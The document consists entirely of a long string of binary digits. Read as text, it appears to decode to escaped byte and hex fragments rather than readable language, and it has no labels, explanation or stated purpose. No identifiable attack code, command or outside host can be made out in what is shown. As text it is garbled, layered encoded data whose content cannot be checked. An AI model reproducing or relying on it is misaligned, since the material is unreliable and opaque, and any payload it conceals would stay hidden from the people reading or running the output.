010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110101001100100011000000110100001101100011011000110101001101100011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011100110010001101100011000100110010011001100011001100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110010100110011001100000011001001100101001100110011000100110010011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001100100110010100110110001101100011011000110011001100110011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101100011011001100110001101110011100000110010011001100011001100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110010100110011001100000011001001100101001100110011000100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000111001001101010110010000110000011000010011000001100001001101100110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000110111001101100011100100110110011001010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110010000110010001101110011011000111000001101110011010000110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110000001101110011001100110011011000010011001001100110001100100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101110011011100110111001101110011011100110010011001010011011000110110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001100110011011000110101001101100011001000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100110001000110010011001010011011000110011001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001000011001001100110001100100011011100110000011000010011011001100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110001101110011011100110011001100110110010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001101100011100000110111001101000011011100110100001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011001101100001001100100110011000110010011001100011011100110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011011100110111001101110011001001100101001101100011011000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100010001100100110010100110110001100110011011001100110001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001100011011001100011001101100110011000110110001101110011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110010011001010011011100110000001101100011100000110111001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100110001101100110001100110110011001100011011000110111001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011010101100110001101100011000100110111001101000011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110110011001000011011100110000001101110011010000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001100100011011000110110011000110011011100110111001101110011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011011001000011001100110001001100110011000100110011001100000011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000110000100110110011000110011011001100110001101100011011100110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001100110011000100110010001100000011001101100100001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110000011011100110100001101110011010000110111001100000011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110000100110010011001100011001001100110001101110011011100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110010001100100110010100110110001101100011011000110001001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011011000110011001101100110011000110110011001000011001001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110000011000010011011001100011001101100110011000110110001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001100110011000100110010001100000011001101100100001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011000110010001100100110010100110110001101100011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000110000100110000011000010011011001100101001101100110011000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001100000110000100110111001100000011011000110001001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011001100011001100110110010000110011001100000011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110110011001100011011000110111001100110110010000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100000110000100110010001100110011001000110111001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110100001101110011000000110111001100110011001101100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110011000110010011001100011011100110111001101100011010100110110001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001101100011011000110110001100010011011000110011001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011001100110001101100110011000110110011000100011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110011001100011011001100100001100100110011000110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111000001101100011010100110110001100110011011001100010001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000111001001101100110010100110111001101000011001001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110011000110110011001010011011000110101001101110011100000110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100000110000100110110001101000011011000110101001101100011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011000110001001101110011010000110111001101000011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110011000100011001000111000001101110011000000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001101110011001100110111001101110011011001100110001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101000011001000111001001100110110000100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110110001101110011011001100011001101100110011000110110001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101100110001100110010001100000011011100110000001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011011000110101001101100110001100110010011000110011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110010011000110011011100110001001100110011001000110010011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100011001101100110011000110110001101110011000001100001001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011000110110001100100011000000110110011001010011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110010000110011011001000011011000111001001101100110010100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000111000001101110011000100110011001100100011001000111001001100110110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011000110001001101100110010100110110001101010011011001100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110010000110011001100010011000001100001001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110110001110010011011000110110001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001101100100001100110110010000110011001100010011001101100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001100110011011100111001001101110011001100110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001101110011010000110110001101000011011001100110001101110011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001001100101001101110011011100110111001100100011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110110001101010011001000111000001100100011001000110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001100100011001000110010011000100011010100110111001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100100011010101100010001100100110000100110101011001000011001000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110001000110100001100110011001001100010001100100011001000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100100001101100011010100110110011001010011011000110011001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011000110001001100100011000000110111001100000011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110010001100000011011001100010001101100011010100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110010001100100110001000110100011001100011001001100010001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101010011011100110011001100100011000000110010001101010011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110010100110010011001010011001000110000001100100011001000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110101001100100011100000110110011001010011011001100110001100100110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011000110001001101110011001100110111001100110011011100110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011011000110100001100100011100100110010011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010100110111001100100011100100110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110111001100110011011100111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110010011001010011011100110011001101110011010000110110001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011010100110111001101000011001001100101001101100011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000110011011100110101001101110011001100110110001110000011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100100110000011000010011001000110000001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110110001100100011011100110010001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011000110100001101100011010000110110001110000011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001101000011011000110101001101110011001000110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100110110010000110010001100000011010101100010001100100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011010100110101001101110011001100110110001101010011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110010000110110001100010011011000110111001101100011010100110110011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011011100110010011000110011001000110000001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011011000110011001101100011100000110110011001100011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110001101010011001000111000001101110011010100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101110011010000110111001100110011001000111001001100100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011001000011000001100001001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011011100110011001101100011100100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001100100011000000110011011001000011001000110000001101100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011001001100101001101100110011000110111001100000011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110010001110000011011001100011001101100110011000110110001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100110010100110010001110010011000001100001001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110010001100000011011000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110010011001010011011100110011001101100011010100110110011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101100011001100110111001101000011010101100110001101100011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011100110010001101100110010000110010001110000011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110011011001000011001100110000001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110010001100110011001000110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110011001100011011001100010001100000110000100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001100100110010100110110001101100011011001100110001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001000011010101100010001100100011011100110110001101010011011001100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001110010011011001100011001100100011011100110101011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100110110010000110110001101010011011001100100001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011001100011001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001101100011001000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001101100011011000110110011001100011011100110010001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011000100011001000110111001101110011000000110110001100010011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110010001101110011010101100100001100100011000000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110111001101100110011000110111001100100011011000110100001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011100110010001100100110010100110111001100110011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001000110110011001000011011000111001001101110011010000110010001110000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110110011000110011011001100110001101100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001101100100001100100011000000110110001100100011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110010100110110001101110011011000110101001101110011010000110111001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100110001100110010001110000011001000111001001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011000110110001100100011000000110110011000110011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011011100110010001100000011001000110001001100110110010000110110011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100011011100110111001100110011001000110000001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011011000110100001100100011000000110110011000110011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110001101110011011100110011001100110011000100110011011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110111001100000011011100110010001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011011100110100001100100011000000110110011000110011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011011100110000011000010011001000110000001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011011100110100001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001110010011001101100001001101100110011000110111001100000011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110010001110000011001000110111001100100110011000110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001100100110011000110111001100000011011000110001001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011100110100001101100011000100110111001100100011011000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001101000011001001100101001101110011010000110111001110000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011011100110010011000110011001000110111001101110011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000111001001100100110010100110111001101110011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110111001101000011011000110101001100100011100000110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001101110011001000110010001110000011011100110000001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101000011001000111001001100100110001000110010001101110011010101100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110010001101110011001001100010001101110011001100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001100100011100000110110011000110011011001100110001101100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110010011001000111001001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001100100011000000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100001001101110011000000110110001100010011011100110011001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011000111001001101100011011000110010001100000011011001100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110001101110011001000110000001100110110010000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100110001100110110011001100011011000110111001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011001000110000001101100110011000110111001100100011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110110011001100011011000110111001100100011000000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100100001100100011000000110110011000110011011001100110001101100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011001100101001100110011000100110011011000010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001101110011000000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100110010100110111001101000011001000110000001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011000110011011001100101001101010110001100110110011001010011010101100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110010001100000011010101100010001100100110000100110101011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101010011000000110110001100010011011100110011001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101100011011001100110001101110011010100110110011001010011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010011001010011001001100101001100100011000000110010001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110001001100100011001000110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011100110000001101110011001000110110001110010011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110010001100000011001000110010001101010110001100110110011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101010110001000110010011000010011010101100100001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101001100000011011000110001001101110011001100110111001100110011011100110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011011000110100001100100011000000110011011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011010100110111001100110011010101100011001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100100011001000110000001100100011010100110010001100000011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011011000110100001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001100100110010100110110001101010011011100111000001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001000111000001100110011000100110010001110010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011011000110101001101110011100000110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011000000110111001101000011001000110000001101000110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011100111001001101100011001000110110011001100011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001101000011010000111001001101100110010100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011001000110111001100100011011100110101001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001101100001001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001000110010011000010011010101100100001100100011000000110100001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100111000001101100011100100110111001101000011011000111001001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101110011001000110000001101110011000000110111001100100011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011011100110111001100100011011000110001001101100110010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001100100110010100110010001100000011001000110010001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011001100110001101110011001000110110001100010011011000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110010011001100011011100110011001101100011010000110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101110011001000110110001101000011001100110001001100100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011011000110110001101100011001000110010011001010011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110111001101000011001000110111001100100110001100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110111001100100011011100110010001110010011001001100101001101110011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011000111001001101110011010000110110001101010011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010000110110011000110011001001100010001100100011011100110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001100100011011100110010011000100011011100110000001101110011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011011100110011001101110011010000110111001100100011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110110011001100011001000111001001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011011000110101001101110011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011000110001001101110011001100110111001100110011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001100000011011100110100001100110110000100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011011000111001001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110010001101100011000100110110001100110011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001000110110001100010011011000110011001101100110001000110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011011000110110001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001101100100001100100011000000110111001101000011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001100110011011000110101001101100011001000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101100110001000110010011001010011011000110110001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011001100100001101100011000100110111001101000011010101100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001110000011011000110011001101100011010100110111001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001101100011100100110110011001100011011001100101001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110111001100110011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110010001100000011001101100100001100100011000000110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100111001001101110011001100110010011001010011011000110101001101110011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100110011010101100110001101100011100100110110011001010011011000110110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110000011000010011001000110000001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011011100110101011000110011011001100101001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011011000110101001101100011100100110010001110000011001000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001000110011001100010011010101100100001100100011100100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110011001100100011100000110010001101110011001000110111001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000010011011001100110001101100011100100110110011001010011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011011000110110001101010011001000111000001100100110000100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101100011100100110010001110000011001000111001001100100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001000110000001100100011100000110111001101010011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001100110110011001010011010100110000001101100110001100110110001101010111